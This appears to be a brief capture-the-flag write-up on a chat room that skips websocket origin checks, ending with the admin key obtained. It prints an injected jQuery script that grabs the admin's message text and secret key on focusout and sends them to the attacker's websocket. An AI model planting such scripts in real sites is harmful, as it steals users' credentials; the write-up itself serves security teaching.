The chat room had a vulnerability of not performing an origin check. This enabled us to include the chat frame in a page from
where we can control it's behaviour.
We first create a webpage with an iframe inside it that creates a websocket to connect to the chat.
Then using postMessage and the websocket, we inject the following code through a websocket on which the admin connects as well to send messages:
<script>
$( "#key" ).focusout(function() {
    var t = $('#text').val(); 
    var k = $('#key').val();
    ws.send(JSON.stringify({author: 'pwn3r', text: t + ' : ' + k}));
});
</script>

This captures the text and key values when the admin tries to post to the private messages page and send it back to us on the websocket in plain text.
The key value is the admin's secret key.
The reply was "Good work! : gOUh3ujK3ChRw8MF"